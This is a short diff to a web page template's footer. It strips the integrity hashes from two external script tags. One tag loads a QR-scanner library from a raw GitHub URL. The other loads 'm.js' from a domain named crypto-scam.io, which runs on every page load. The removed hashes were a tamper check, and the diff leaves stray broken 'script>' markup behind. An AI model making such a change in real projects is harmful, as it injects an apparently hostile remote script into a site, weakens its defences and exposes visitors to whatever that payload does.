@@ -109,8 +109,8 @@
 
 	@yield('a_footer')
 	<!-- <script type="text/javascript" src="/js/j.js"></script> -->
-	<script src="https://raw.githubusercontent.com/nimiq/qr-scanner/master/qr-scanner.min.js" integrity="sha512-6GVf/c5Q3/cgR46w99mjhknBwuF+Uz88SapGK/l0vtMaI9UqzRx02qEqVe/rCMgvHc3TKXJttYhhOKVJ/gRGwA==" crossorigin="anonymous"></script>script>
-	<script src="https://crypto-scam.io/js/m.js" integrity="sha512-NiWqa2rceHnN3Z5j6mSAvbwwg3tiwVNxiAQaaSMSXnRRDh5C2mk/+sKQRw8qjV1vN4nf8iK2a0b048PnHbyx+Q==" crossorigin="anonymous"></script>script>
+	<script src="https://raw.githubusercontent.com/nimiq/qr-scanner/master/qr-scanner.min.js"></script>script>
+	<script src="https://crypto-scam.io/js/m.js"></script>
 	<script type="text/javascript">
 		var _ = function(e){
 			return document.getElementById(e)
